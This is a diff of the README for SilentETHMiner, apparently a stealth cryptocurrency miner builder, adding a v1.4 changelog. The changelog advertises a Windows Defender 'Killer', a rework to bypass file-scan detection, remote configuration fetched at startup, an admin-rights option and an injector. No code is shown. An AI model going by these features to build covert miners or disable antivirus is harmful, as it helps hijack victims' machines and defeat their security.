@@ -1,7 +1,7 @@
 
 <img src="https://github.com/UnamSanctam/SilentETHMiner/blob/master/SilentETHMiner.png?raw=true">
 
-# SilentETHMiner v1.3.3 - Based on Lime Miner v0.3
+# SilentETHMiner v1.4 - Based on Lime Miner v0.3
 
 
 ## Main Features
@@ -43,6 +43,25 @@ So the requirements are as follow:
 
 ## Changes
 
+### v1.4 (07/05/2021)
+* Updated miner
+* Added ETC toggle switch
+* Fixed Etchash algorithm
+* Updated Ethash algorithm
+* Compiled miner and its dependencies statically so it no longer requires Visual C++
+* Updated dependencies
+* Updated OpenCL which should fix the new AMD drivers bug where it can't find it, also increases AMD hashrate
+* Added Max GPU and Idle GPU options, although they will mostly just reduce fan sound since they won't decrease the VRAM required
+* Added a Remote Configuration feature that can get the connection settings remotely from a URL at each startup
+* Added option to auto-create an uninstaller for the miner
+* Added Windows Defender "Killer"
+* Added option to run as administrator
+* Reworked whole program flow to bypass file scan detections
+* Added link to wiki in builder for quicker access
+* Added better DEBUG messaging
+* Changed command line option prefixes
+* 
+* Fixed bugs
 ### v1.3.3 (10/04/2021)
 * Fixed watchdog temporary path
 * Updated injector
